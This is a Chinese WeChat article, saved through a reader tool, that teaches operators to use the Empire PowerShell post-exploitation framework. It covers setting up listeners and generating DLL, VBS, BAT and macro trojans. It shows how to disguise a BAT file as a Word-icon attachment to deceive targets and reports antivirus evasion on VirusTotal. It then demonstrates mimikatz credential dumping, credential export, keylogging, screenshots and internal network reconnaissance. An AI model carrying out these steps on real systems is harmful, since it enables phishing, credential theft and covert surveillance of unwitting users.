> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yKCv9yr5TwZoDEyoJcbrsA)

0x00 简介

Empire 是一款针对 Windows 平台的, 使用 PowerShell 脚本作为攻击载荷的渗透攻击框架代码具有从 stager 生成, 提权到渗透维持的一系列功能, 无需 powershell.exe 就可以使用 powershell 的代理功能还可以快速在后期部署漏洞利用模块, 内置模块有键盘记录, Mimikatz, 绕过 UAC, 内网扫描等, 可以躲避网络检测和大部分安全防护工具, 类似于 Meterpreter, 是一个基于 PowerShell 的远控木马 (www.powershellempire.com)

0x02 安装

git clone https://github.com/EmpireProject/Empire.git

0x03 使用

help 查看帮助

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK8Ea0Bya03Opm1oIgfzEQcKIc50fdS3ek3KjKnF9BTWrknyAE80cVjw/640?wx_fmt=png)

1.  设置监听
    
2.  listeners #进入监听线程界面
    
3.  uselistener #设置监听模式
    
4.  info #查看具体参数设置
    
5.  set #设置相应参数
    
6.  execute #开始监听
    

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKV281FG76ia2YbKFib1xFAxaVOAKNY3ibNnStrGSyibDQTtL3PQdaHiaeDcA/640?wx_fmt=png)

uselistener 用来设置监听模式

uselistener <tab> <tab> 查看可以使用的监听模式

uselistener http 采用 http 监听模式，输入 info 查看具体参数设置

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKibu5Z5icK4MWztNChxc2DsVtlosyH7sg8iaAicoV2IH33GaZOV8vlx0hMg/640?wx_fmt=png)

Required 为 true 的参数都是需要设置的

set Name Micr067 #设置任务名称

set Host 192.168.190.133 # 设置主机 IP（Empire 所在服务器的地址）

execute # 执行

参数设置好后，可以在执行之前使用 info 检查参数配置是否正确

# 需要注意的是 Empire 不同于 metasploit，Empire 命令是区分大小写的

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKeHtRpGVxxMnFicqv39jy3eYNbOXySUyDrd7pJszYzAbHRe0tq5u4I4A/640?wx_fmt=png)

输入 back 可以返回上一层，也就是 listeners 界面，

list 列出当前激活的 listener

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK8V33zby409ab5t6iaYhenLdypia6KDicPP4KzslAW5HFmArgD3KQRnRMw/640?wx_fmt=png)

1.  生成木马
    
2.  usestager #设置模块
    

使用 usestager 命令设置生成木马的模块

usestager <tab> <tab> 查看所有可使用的木马生成模块

其中 multi 为通用 mok，osx 为 Mac 操作系统的模块，windows 就是 windows 的模块。

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKJBgG1YDM7vqrLR19LEaX8fp12eibgbwmlsqKjMFa5pR4aZVdFycu1Sg/640?wx_fmt=png)

(1) dll 模块

usestager windows/dll # 选择 dll 模块

info 查看一下需要设置的参数信息

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKglO76xI4uHNM4rpGGGjAUnPZZDdlEpSLzEGVepoXfLicGtqXJSf5psQ/640?wx_fmt=png)

这里我们需要设置一下 listener，然后 execute 执行，木马生成目录 /tmp/launcher.dll

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKIehUjIZ0icVIT2q9bYYIYkhLTwrIhmpUVKXBg6JqvkZKrGvfyWXWeUg/640?wx_fmt=png)

(2) launcher

如果只需要简单的 powershell 代码，在设置完相应的参数后，可直接在监听器中输入命令 launcher <language> <Listener Name> 生成 base64 编码的代码，

输入 back 返回到 Listener 界面，输入 launcher powershell Micr067 来生成一个 payload

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK8IImHBfzgXPicnXPIrsTD5s3nBjzBOeZuHaGVKnUuPnApKewI4BW77w/640?wx_fmt=png)

然后将生成的 payload 在目标机器上执行，即可获得 session

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK1iauB1aukc2aMN5p3dptTT6Uw2BAQqicSU0gkY8RGP9w4EbpLIWUIudw/640?wx_fmt=png)

可以看到 Empire 已经上线了一个名为 GL8DBS32 的主机，

输入 agents 可以查看已经获得的 session，这里的 agents 相当于 msf 中的 sessions -l

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK1XUe0Wsxsyf2P0LianUyLkLaqd5hQOvpAajZXiaCvXAyG7HeE7zY01gg/640?wx_fmt=png)

此时的代理名 GL8DBS32 是随机生成的，为了方便记忆，我们可以通过 rename 对其重命名

rename <Old Name> <New Name>

rename GL8DBS32 PC2

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKYF0XFEuicerQOd7iaAdlmVMBeHYu6vvdBL0lY8aGybAWtZwIib0W3prHA/640?wx_fmt=png)

(3) launcher_vbs

usestager windows/launcher_vbs # 设置 launcher_vbs 木马

set Listener micr067

execute

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKxk7YHVVnVwfQAS9Hn6tvaMHaaVwxR9h7eS1KF7pL5yaKFQoVicQBiaQg/640?wx_fmt=png)

当在目标机器上执行 vbs 木马，即可获得 session，

当然也可以在配置好参数后返回 listener 通过 launcher powershell micr067 生成 base 64 代码运行

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKbtbTdylg4nZPf05wBQ9OJuuEUN9K6kpibUG5TrgqBPfs5o6qe7zu84A/640?wx_fmt=png)

（4） launcher_bat

usestager windows/launcher_bat

set Listener micr067

execute

在目标主机上运行生成的 launcher.bat，成功获得一个新的 session

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKadnPz3YLicIzBGHp7ediamPpknrBYia18upLiahGHcuIafxa3JtOzkns0A/640?wx_fmt=png)

为了增加迷惑性，可以将 bat 文件插入一个 office 文件（word/excel）中，依次选择插入—对象—选择 “由文件创建”—通过浏览“选定 bat 文件”—勾选“显示为图标”—“更改图标” 从而获得更好的迷惑性，

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK4NJlnhE6wnficfRXeweNesd3ZyA3r2Nd8CnKic8ic7bzmUX5DE3gkFIDA/640?wx_fmt=png)

将图标更改为 word 图标，更改文件显示名，可以获得更好的迷惑性，此处没 word 图标就凑活着用吧！

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK24JOytxr9ePGSzRicAAH4JwLSGcHJlFuxTYZQRibsYC0285cnSrkOPng/640?wx_fmt=png)

额，要是改为 word 图标简直完美。

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKg1YqicsMyiceNqxzk1Cp3mbPfCkvKsPYcFF5KFBJrtgRmrL9PH53XZJw/640?wx_fmt=png)

当目标机器用户点击了 word 中的附件，即可触发运行 bat，kali 成功又获得一个新 session

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKEjtKibLymUBarCXtKxyBZMUZnt9miaqJKVA4aGEA1wdfNvicic8Hh89AOQ/640?wx_fmt=png)

（5）Macro 木马

usestager windows/macro

set Listener micr067

execute

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKWBlX3Lngc3jEZqCNZDGextEFyTTOU9waTc2nuAhuQA2GQojVibvVxlQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKBB27ia9JvugyaXHB2L380mZiaqHETMCy0PCawBumYo9vhvTYIu27NhBA/640?wx_fmt=png)

将生成的宏文件添加到 office 文件中，打开 word 文档，点击 “试图”，选择“宏”，“宏名” 随便起，宏位置选择当前 office 文件，单击 “创建” 会弹出 VB 编辑界面。

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKbA2M5GVX7gLM25PrAic0QWUMA3RJicnykyYGcTHsc706Dd2c2FPEfLug/640?wx_fmt=png)

将原来的代码删除，将 macro 宏文件代码复制粘贴到其中，另存为 “word 97-2003 文档”

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK9ENXHK5o1iaj79ZrvibaThg1owN0WsLnGibYx2QHFrxIj5zlHd9d8gEVQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKRqeN30sBxXP9Zo3Pq8IHJsRw55B8hViaQf1jP9y31EKUwAEU9BdvYeQ/640?wx_fmt=png)

word 97-2003 文档

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK9b9Tmh3zwlLDnicA4Y82jm4mwbJQ9Qfm9v63ZDRbG9VM4VlSicnT1brA/640?wx_fmt=png)

将修改好的 word 发送到目标机器，当用户点击触发即可运行宏病毒，当用户点击启用宏内容时，

服务端将接收到 session

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKwELsbuSMNBSY978icicJxQ1rdeO2Z7dibuANkn2XaGmasyNBBxHNvqxWQ/640?wx_fmt=png)

由于在物理机上安装有杀毒软件，在物理机上打开 word，服务端成功获得 session，短时间内杀软未报毒，

当用户点击了 “启用内容” 按钮，下次打开 word 会自动运行宏病毒，不再弹出提示。

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKuemTicTY77l5FFdKqvMDibYBaZRXKD2Y20SSEeKo8JfNxhnpNwPPiac6Q/640?wx_fmt=png)

杀软反应还是很迟钝的，慢了 7,8 分钟，应该是本地病毒库没有匹配到特征在云端分析的

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKD1vukDCtC1zFibtqCPYXH5U2r7eBS0wicFN8kQcfKn3YxVlp00DYYqHg/640?wx_fmt=png)

将样本上传 virustotal 进行分析，57 家只有一家能够准确识别该宏病毒，

除了白利用，这种效果还是很理想的。

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK2E0sHq44U7xRBo7Hm9PvChMGhKxj7RBaGBC3YdVSqicMDWAJVUAGFibA/640?wx_fmt=png)

使用微步进行分析，检出率为 0

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKVnKOcwxKEjt4up5sibXichl4hfGxqww0GDrOiaib2tJ2LLI2hIIRBE4dBw/640?wx_fmt=png)

1.  连接主机
    
2.  agents #列出当前已连接的主机
    
3.  interact #连接主机
    
4.  remove stale #删除失效主机
    
5.  help agentcmds #查看常用命令
    
6.  使用 CMD 命令时, 要使用”shell + 命令”
    

使用 agents 列出当前已经连接的主机，Username 带（*）说明是已经提权成功的主机。

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK1f56Sia025BpH2YibhXgc7tsO56GPLtJxSIoajEYepSjaqepUiaWWCqAA/640?wx_fmt=png)

interact <主机名> # 使用 interact 连接主机，主机名可以用 tab 补全

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKhHIRh9J0AmTSKbfzAwSjdyLF1DlrVwSxIKFvOA9R1nfC3waSUDEib3Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKq6vszibJbJcRctSE8wBSSxTeDkick0ialLwCV6uHia6axZHGMRtnH9XKZA/640?wx_fmt=png)

使用 help agentcmds 查看常用命令

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKXhUHb58HZm4BazX4BNaIy4cBJpq7BcMSlKZT84yJzdicV9c57sA8jBA/640?wx_fmt=png)

尝试一下 Empire 内置的 mimikatz 模块，输入 mimikatz 命令，使用 mimikatz 需要管理员权限，由于物理主机装了杀软，提权会被杀软拦截，这里使用的是 payload 域内的一台 win7 靶机。

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKsgVuSKej0If7cTMiaSIDsUI2BO1qeibdmTPHibXtCY7sAkBXAgfNG8U1w/640?wx_fmt=png)

creds 命令可以自动过滤、整理出获取到的用户密码。

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKC0rbXtG8v6icANeMWQxmPGqYmBPJZVqcaa5QcKRE48JGk8r24ujqKRw/640?wx_fmt=png)

当内网抓取到的密码比较多，比较乱的时候，可以通过 命令对 hash/plaintext 进行排列、增加、删除、导出等操作，

将 凭证 导出 ，输入 creds export /root/pc2.csv

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKBoSYicIp85grdOV7mpDyWVias62WxMOC1uSHwSVv6DompYvp55nXX7oA/640?wx_fmt=png)

pc2.csv.csv

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKnkDzq3jZib2BONsHGqAKJwjNG4kOGZ4fNicQBHQMhaX0yh90w66eucpA/640?wx_fmt=png)

在实际渗透中，总会出现部分主机会话丢失或者失效的情况，

使用 list stale 命令 列出已经丢失的反弹主机，然后输入 remove stale 命令删除已经失效的主机

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKC4peagicM0j7PuPv9EVQGzwiaLkABPVvzndz3ZM2hYRxes65GSPa9UtQ/640?wx_fmt=png)

其他命令：

Bypass UAC 提权、SC 截图、Download 下载文件 、Upload 上传文件。。。

1.  信息收集
    
2.  search module #搜索需要使用的模块
    
3.  usemodule powershell/collection+Tab #查看完整列表
    
4.  常用模块
    
5.  usemodule powershell/collection/screenshotàexecute #截屏
    
6.  usemodule powershell/collection/keyloggeràexecute #键盘记录
    
7.  usemodule powershell/collection/clipboard_monitor #剪贴板记录
    
8.  usemodule powershell/situational_awareness/network/powerview/share_finder #列出域内所有共享
    
9.  usemodule powershell/situational_awareness/host/winenum #查看本级机用户, 域组成员系统基本信息等
    

usemodule <tab> <tab> # 查看所有模块

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKjz5vYC17L7mQFlUAeOsWkhU9Eaw9FlebIPoE4qebuGVK8WXYxvibp1w/640?wx_fmt=png)

usemodule powershell/collection/ <tab> <tab> # 查看 collection 模块具体功能

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK3AE7Am0Xiau07sqWHkgN6F6w9FgibB99xL27pWE8EaiaM8iaQ4JD3BtK7A/640?wx_fmt=png)

屏幕截图

usemodule powershell/collection/keylogger

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKicM8LfWW8AYjO9swd0SF1TPLZj7TooBiaTEQriazFgt85icvDnmmbicghTQ/640?wx_fmt=png)

截屏结果保存在目录 Empire/downloads / 主机名 / screenshot

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIK288xjm5mmEGaMX4DO1590JGRcICsmzXJKLGwicv5ICzODrPL5CK1qpg/640?wx_fmt=png)

键盘记录

usemodule powershell/collection/keylogger

set Agent PC2

execute

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKoTPqMp3T7mQ18iboAbd43Q1d7ibmy5ZQRXgN5RselMiaJubj9z7KiawWOA/640?wx_fmt=png)

键盘记录结果保存在目录 Empire/downloads / 主机名 / agents.log

![](https://mmbiz.qpic.cn/mmbiz_png/fQ4PtepQmkr436iavLBrcYKcoXSOYjEIKApqodhVjYAPbhIMHrXegoYice0BtmrsflMy6tWKEtRRr4tot1AhAG7A/640?wx_fmt=png)

列出域内所有共享

powershell/situational_awareness/network/powerview/share_finder

查看本机用户, 域组成员系统基本信息

usemodule powershell/situational_awareness/host/winenum

列举系统中所有有用信息，报告各种日志、RDP 登录信息等

usemodule powershell/situational_awareness/host/computerdetails*

ARP 扫描

usemodule powershell/situational_awareness/network/arpscan

set Agent PC2

set range 192.168.190.1-192.168.190.254

execute

dns 信息获取

usemodule powershell/situational_awareness/network/reverse_dns

显示当前内网 dns 服务器地址

usemodule powershell/situational_awareness/host/dnsserver

查找域管登录服务器 IP

usemodule powershell/situational_awareness/network/powerview/user_hunter

作者: Micr067

**公众号后台回复关键词 “口令”，获取常见 web 系统及厂商网络安全设备默认用户名及密码汇总（220 页 PDF 文档）。**

白名单转载于安全祖师爷

**推荐阅读**[**![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyIDG0WicDG27ztM2s7iaVSWKiaPdxYic8tYjCatQzf9FicdZiar5r7f7OgcbY4jFaTTQ3HibkFZIWEzrsGg/640?wx_fmt=png)**](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247494811&idx=1&sn=23ec661f57424184e43ea216a8398c58&chksm=9acd3c04adbab512e2a1c40156b05a5dc40ea07dacf239a9041235324a563d555a4e4625e988&scene=21#wechat_redirect)  

公众号

**觉得不错点个 **“赞”**、“在看”，支持下小编****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**